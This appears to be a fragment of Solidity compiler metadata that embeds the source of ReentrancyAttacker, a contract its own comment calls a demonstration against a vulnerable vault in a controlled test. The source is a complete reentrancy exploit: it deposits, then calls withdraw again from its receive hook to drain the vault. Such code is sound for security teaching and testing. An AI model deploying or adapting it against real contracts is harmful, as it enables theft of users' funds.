  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"vaultAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackDeposit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackerBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reentryCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vault\",\"outputs\":[{\"internalType\":\"contract IVault\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"notice\":\"Demonstrates reentrancy against VulnerableVault in a controlled test.\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ReentrancyAttacker.sol\":\"ReentrancyAttacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/ReentrancyAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity >=0.8.0 <0.9.0;\\n\\ninterface IVault {\\n    function deposit() external payable;\\n\\n    function withdraw() external;\\n}\\n\\n/// @notice Demonstrates reentrancy against VulnerableVault in a controlled test.\\ncontract ReentrancyAttacker {\\n    IVault public immutable vault;\\n    uint256 public attackDeposit;\\n    uint256 public reentryCount;\\n\\n    constructor(address vaultAddress) {\\n        require(vaultAddress != address(0), \\\"Attacker: zero vault address\\\");\\n        vault = IVault(vaultAddress);\\n    }\\n\\n    function attack() external payable {\\n        require(msg.value > 0, \\\"Attacker: attack value must be positive\\\");\\n        require(address(this).balance == msg.value, \\\"Attacker: withdraw existing balance first\\\");\\n\\n        attackDeposit = msg.value;\\n        reentryCount = 0;\\n\\n        vault.deposit{value: msg.value}();\\n        vault.withdraw();\\n    }\\n\\n    receive() external payable {\\n        require(msg.sender == address(vault), \\\"Attacker: unexpected sender\\\");\\n\\n        // Stop naturally when the vault no longer holds another full withdrawal.\\n        if (address(vault).balance >= attackDeposit) {\\n            reentryCount += 1;\\n            vault.withdraw();\\n        }\\n    }\\n\\n    function attackerBalance() external view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\",\"keccak256\":\"0xf72327313c611d8fb0a9440f5167f2f6b58eb5a8142cebf095f9129c51a03964\",\"license\":\"MIT\"}},\"version\":1}",
